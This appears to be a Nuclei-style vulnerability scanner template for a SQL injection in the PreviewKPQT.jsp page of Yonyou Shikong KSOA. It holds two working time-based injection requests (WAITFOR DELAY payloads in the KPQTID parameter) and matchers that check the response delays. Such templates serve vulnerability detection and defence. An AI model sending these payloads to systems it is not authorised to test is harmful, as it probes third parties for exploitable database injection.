id: yongyoushikong-KSOA-PreviewKPQT-sql

info:
  name: 用友时空KSOA PreviewKPQT SQL注入
  author: HuanXiong
  severity: high
  reference: |
    -
  tags: SQL Injection

http:
  - raw:
      - |
        GET /kp/PreviewKPQT.jsp?KPQTID=1%27%3BWAITFOR+DELAY+%270%3A0%3A4%27-- HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /kp/PreviewKPQT.jsp?KPQTID=1%27%3BWAITFOR+DELAY+%270%3A0%3A8%27-- HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and


 




